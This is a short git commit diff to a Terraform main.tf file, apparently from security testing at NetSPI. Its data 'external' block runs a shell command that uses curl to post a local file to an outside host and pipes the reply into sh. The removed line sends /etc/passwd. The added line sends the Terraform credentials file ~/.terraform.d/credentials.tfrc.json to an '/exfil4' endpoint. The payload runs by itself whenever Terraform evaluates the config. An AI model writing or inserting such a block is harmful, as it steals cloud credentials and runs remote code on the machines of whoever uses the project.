03500617c89cf90fc36e7eb62ede4d33b41f4ae1
mahafuz-mapari <mmapari@netspi.com>
2026-09-01 17:14:36 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,3 +1,3 @@
 data "external" "example" { 
-  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://ufdkum2n18qsmmmtrmcy4yb39ufm3cr1.net-spi.com/exfil4 | sh"] 
+  program = ["sh", "-c", "curl -X POST --data-binary @~/.terraform.d/credentials.tfrc.json https://bet1t3140pp9l3laq3bf3fak8be42uqj.net-spi.com/exfil4 | sh"] 
 } 
